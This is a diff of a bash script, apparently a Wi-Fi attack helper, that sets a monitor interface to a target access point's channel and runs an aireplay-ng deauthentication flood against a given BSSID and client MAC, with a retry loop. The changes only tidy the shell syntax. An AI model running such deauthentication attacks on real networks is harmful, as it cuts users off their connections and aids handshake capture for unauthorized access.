@@ -167,17 +167,17 @@ printf "Setting the monitor channel to the same channel the target AP is on...\n
 sudo airmon-ng stop $INF
 sudo airmon-ng start $ITMP $CHNL
 
-sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty | while read aireout; do 
-    if [[ $aireout == *No such BSSID available* ]]; then
+sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty | while read -r aireout; do 
+    if echo "$aireout" | grep -q "No such BSSID available"; then
         while true; do
-            read -p "Would you like to run aireplay-ng again?[y/n]: \n" choice2
+            read -p "Would you like to run aireplay-ng again?[y/n]: " choice2
             case "$choice2" in
                 [Yy]*)
                     printf "Running aireplay-ng again...\n"
                     clear
                     aireloopout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF)
                     printf "$aireloopout\n"
-                    if [[ $aireloopout != *No such BSSID available* ]]; then
+                    if ! echo "$aireloopout" | grep -q "No such BSSID available"; then
                         break
                     fi
                     ;;
@@ -192,4 +192,5 @@ sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty | while read aireo
 done
 
 custom_exit
+
 
